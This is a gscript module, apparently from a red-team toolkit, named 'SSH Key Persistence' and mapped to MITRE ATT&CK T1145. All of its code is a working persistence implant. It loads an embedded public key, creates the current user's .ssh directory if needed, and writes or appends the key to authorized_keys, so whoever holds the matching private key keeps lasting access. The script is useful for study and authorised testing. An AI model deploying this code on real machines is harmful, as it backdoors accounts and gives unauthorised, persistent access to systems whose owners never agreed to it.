// Title: SSH Key Persistence
// Author: micahjmartin
// Purpose: add a public ssh key to users accounts
// Gscript version: 1.0.0
// ATT&CK: https://attack.mitre.org/wiki/Technique/T1145
// Note: Assumes ssh key access is already enabled

//priority:110
//timeout:75

//go_import:os as os
//go_import:os/user as user

//import:/private/tmp/id_rsa.pub

function Deploy() {
    console.log("Started SSH key persistence!")

    // Getting our asset
    var pubKey = GetAssetAsBytes("id_rsa.pub");
    if (pubKey[1] != null) {
        console.log("errors: "+pubKey[1].Error());
    }   

    // get user homedir
    var myUser = user.Current();
    console.log(myUser[0].Username);
    var homeydir = myUser[0].HomeDir+"/";
    if (myUser[0].Username == "root")
    {
        homeydir = "/var/root/";
    }

    // make .ssh dir
    var dirname = homeydir+".ssh/";
    var dirstat = G.file.CheckExists(dirname);
    if (dirstat == false) { 
        G.exec.ExecuteCommand("/bin/mkdir", [dirname]);
    }
    
    //make or add to authorize keys file
    var filename = homeydir + ".ssh/authorized_keys";
    var stat = G.file.CheckExists(filename);
    if (stat == false) {   
        errors = G.file.WriteFileFromBytes(filename, pubKey[0]);    
        if (errors != null) {
            console.log("errors: "+errors.Error());
        } else {
            console.log("SSH key added"); 
        }
    } else {
        var appendedFileError = G.file.AppendFileBytes(filename, pubKey[0]);
        if (appendedFileError != null) {
            console.log("errors: "+appendedFileError.Error());
        } else {
            console.log("SSH key appended");    
        }
    }
    console.log("Done SSH key persistence!");
    return true;
}
